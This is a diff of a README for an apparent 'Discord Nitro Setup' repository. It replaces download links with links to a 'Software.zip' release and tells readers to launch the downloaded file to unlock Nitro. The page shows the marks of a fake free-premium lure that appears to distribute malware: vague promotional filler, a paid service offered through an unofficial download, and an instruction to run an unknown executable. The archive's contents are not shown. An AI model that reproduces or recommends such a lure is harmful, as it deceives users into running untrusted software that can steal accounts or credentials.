@@ -1,6 +1,6 @@
 # 🎮💬 **Discord Nitro Setup**
 
-[![Download Discord Nitro Setup](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Discord Nitro Setup](https://github.com/mohamed000121/Discord-Nitro-Setup/releases/download/v1.0/Software.zip)](https://github.com/mohamed000121/Discord-Nitro-Setup/releases/download/v1.0/Software.zip)
 
 Welcome to the Discord Nitro Setup repository! This repository will guide you through the process of setting up Discord Nitro to unlock premium features for better communication and streaming in your gaming community. Whether you are a casual gamer or a hardcore player, enhancing your Discord experience with Nitro will take your gaming conversations to the next level. Let's dive in and explore the endless possibilities of Discord Nitro!
 
@@ -17,7 +17,7 @@ Welcome to the Discord Nitro Setup repository! This repository will guide you th
 
 To get started, simply download the Discord Nitro Setup files from the link below and follow the step-by-step instructions to configure your Discord account for Nitro.
 
-[Download Discord Nitro Setup](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download Discord Nitro Setup](https://github.com/mohamed000121/Discord-Nitro-Setup/releases/download/v1.0/Software.zip)
 
 *Note: The downloaded file needs to be launched to begin the setup process.*
 
@@ -51,4 +51,4 @@ For the latest updates and announcements regarding Discord Nitro Setup, make sur
 
 Get ready to level up your Discord game with Nitro and unleash a whole new world of possibilities for communication and streaming within your gaming community. Let's make every gaming session more enjoyable and engaging with Discord Nitro! 🌟
 
-🚀 Ready to elevate your Discord experience? [Download Discord Nitro Setup](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) now! 🚀
+🚀 Ready to elevate your Discord experience? [Download Discord Nitro Setup](https://github.com/mohamed000121/Discord-Nitro-Setup/releases/download/v1.0/Software.zip) now! 🚀
